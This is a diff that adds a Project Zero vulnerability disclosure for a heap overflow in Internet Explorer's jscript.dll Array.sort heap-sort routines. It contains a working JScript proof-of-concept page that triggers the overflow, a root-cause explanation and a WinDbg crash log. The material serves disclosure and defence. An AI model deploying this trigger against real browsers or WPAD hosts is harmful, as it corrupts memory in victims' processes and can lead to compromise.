@@ -1,0 +1,117 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1383
+
+There is an heap overflow vulnerability in jscript.dll library (used in IE, WPAD and other places). The bug affects 2 functions, JsArrayStringHeapSort and JsArrayFunctionHeapSort.
+
+PoC for IE (note: page heap might be required to obsorve the crash):
+
+=========================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+var vars = new Array(100);
+
+var arr = new Array(1000);
+for(var i=1;i<600;i++) arr[i] = i;
+
+var o = {toString:function() {
+  for(var i=600;i<1000;i++) {
+    arr[i] = 1337;
+  }
+}}
+
+function go() {
+  arr[0] = o;
+  Array.prototype.sort.call(arr);
+}
+
+
+go();
+
+</script>
+
+<!--
+=========================================
+
+Technical details:
+
+Array.sort is implemented in JsArraySort which, depending if a comparison function was specified or not, calls JsArrayStringHeapSort or JsArrayFunctionHeapSort. These (vulnerable) functions take several arguments, 2 of which are the input array length and the number of elements currently in the input array (this can be smaller than the array length). The vulnerable functions are going to allcoate 2 buffers to store intermediate data. The size of these buffers will be calculated based on *num_elements*. However, while filling those arrays it is possible that the number of elements is going to increase, which causes a heap overflow.
+
+Debug log:
+
+=========================================
+
+0:023> g
+(e5c.988): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+jscript!NameTbl::GetValCore+0x30:
+000007fe`f4f59df0 498900          mov     qword ptr [r8],rax ds:00000000`04603010=????????????????
+
+0:013> r
+rax=c0c0c0c0c0c00003 rbx=000000000443cf20 rcx=000000000441df90
+rdx=0000000000000003 rsi=0000000004603010 rdi=000000000441df90
+rip=000007fef4f59df0 rsp=00000000129a8e10 rbp=0000000000000000
+ r8=0000000004603010  r9=000000000441fdc8 r10=00000000040a9800
+r11=00000000129a8e70 r12=0000000003ecb690 r13=0000000000000001
+r14=0000000004603010 r15=0000000000000259
+iopl=0         nv up ei ng nz na pe cy
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
+jscript!NameTbl::GetValCore+0x30:
+000007fe`f4f59df0 498900          mov     qword ptr [r8],rax ds:00000000`04603010=????????????????
+
+0:013> k
+ # Child-SP          RetAddr           Call Site
+00 00000000`129a8e10 000007fe`f4f75f0e jscript!NameTbl::GetValCore+0x30
+01 00000000`129a8e70 000007fe`f4f761d8 jscript!ArrayObj::GetValAtIndex+0x62
+02 00000000`129a8eb0 000007fe`f4fbd5a2 jscript!ArrayObj::GetVal+0x28
+03 00000000`129a8f40 000007fe`f4fbcd90 jscript!JsArrayStringHeapSort+0x1a6
+04 00000000`129a90d0 000007fe`f4f5c2ec jscript!JsArraySort+0x270
+05 00000000`129a9180 000007fe`f4f5a9fe jscript!NatFncObj::Call+0x138
+06 00000000`129a9230 000007fe`f4f586ea jscript!NameTbl::InvokeInternal+0x3f8
+07 00000000`129a9350 000007fe`f4fadd72 jscript!VAR::InvokeByDispID+0xffffffff`ffffffea
+08 00000000`129a93a0 000007fe`f4f5c2ec jscript!JsFncCall+0xc2
+09 00000000`129a9430 000007fe`f4f5a9fe jscript!NatFncObj::Call+0x138
+0a 00000000`129a94e0 000007fe`f4f5b234 jscript!NameTbl::InvokeInternal+0x3f8
+0b 00000000`129a9600 000007fe`f4f59852 jscript!VAR::InvokeByName+0x81c
+0c 00000000`129a9810 000007fe`f4f59929 jscript!VAR::InvokeDispName+0x72
+0d 00000000`129a9890 000007fe`f4f524b8 jscript!VAR::InvokeByDispID+0x1229
+0e 00000000`129a98e0 000007fe`f4f58ec2 jscript!CScriptRuntime::Run+0x5a6
+0f 00000000`129aa6e0 000007fe`f4f594b3 jscript!ScrFncObj::CallWithFrameOnStack+0x162
+10 00000000`129aa8f0 000007fe`f4f586ea jscript!NameTbl::InvokeInternal+0x2d3
+11 00000000`129aaa10 000007fe`f4f524b8 jscript!VAR::InvokeByDispID+0xffffffff`ffffffea
+12 00000000`129aaa60 000007fe`f4f58ec2 jscript!CScriptRuntime::Run+0x5a6
+13 00000000`129ab860 000007fe`f4f58d2b jscript!ScrFncObj::CallWithFrameOnStack+0x162
+14 00000000`129aba70 000007fe`f4f58b95 jscript!ScrFncObj::Call+0xb7
+15 00000000`129abb10 000007fe`f4f5e6c0 jscript!CSession::Execute+0x19e
+16 00000000`129abbe0 000007fe`f4f670e7 jscript!COleScript::ExecutePendingScripts+0x17a
+17 00000000`129abcb0 000007fe`f4f668d6 jscript!COleScript::ParseScriptTextCore+0x267
+18 00000000`129abda0 000007fe`ec595251 jscript!COleScript::ParseScriptText+0x56
+19 00000000`129abe00 000007fe`ecd1b320 MSHTML!CActiveScriptHolder::ParseScriptText+0xc1
+1a 00000000`129abe80 000007fe`ec596256 MSHTML!CScriptCollection::ParseScriptText+0x37f
+1b 00000000`129abf60 000007fe`ec595c8e MSHTML!CScriptData::CommitCode+0x3d9
+1c 00000000`129ac130 000007fe`ec595a11 MSHTML!CScriptData::Execute+0x283
+1d 00000000`129ac1f0 000007fe`ecd546fb MSHTML!CHtmScriptParseCtx::Execute+0x101
+1e 00000000`129ac230 000007fe`ec638a5b MSHTML!CHtmParseBase::Execute+0x235
+1f 00000000`129ac2d0 000007fe`ec512e39 MSHTML!CHtmPost::Broadcast+0x90
+20 00000000`129ac310 000007fe`ec56caef MSHTML!CHtmPost::Exec+0x4bb
+21 00000000`129ac520 000007fe`ec56ca40 MSHTML!CHtmPost::Run+0x3f
+22 00000000`129ac550 000007fe`ec56da12 MSHTML!PostManExecute+0x70
+23 00000000`129ac5d0 000007fe`ec570843 MSHTML!PostManResume+0xa1
+24 00000000`129ac610 000007fe`ec556fc7 MSHTML!CHtmPost::OnDwnChanCallback+0x43
+25 00000000`129ac660 000007fe`ecd84f78 MSHTML!CDwnChan::OnMethodCall+0x41
+26 00000000`129ac690 000007fe`ec479d75 MSHTML!GlobalWndOnMethodCall+0x240
+27 00000000`129ac730 00000000`76d19bbd MSHTML!GlobalWndProc+0x150
+28 00000000`129ac7b0 00000000`76d198c2 USER32!UserCallWinProcCheckWow+0x1ad
+29 00000000`129ac870 000007fe`f11a4a87 USER32!DispatchMessageWorker+0x3b5
+2a 00000000`129ac8f0 000007fe`f11ababb IEFRAME!CTabWindow::_TabWindowThreadProc+0x555
+2b 00000000`129afb70 000007fe`fd48572f IEFRAME!LCIETab_ThreadProc+0x3a3
+2c 00000000`129afca0 000007fe`f521925f iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f
+2d 00000000`129afcd0 00000000`76e159cd IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
+2e 00000000`129afd20 00000000`76f4a561 kernel32!BaseThreadInitThunk+0xd
+2f 00000000`129afd50 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
+
+=========================================
+-->
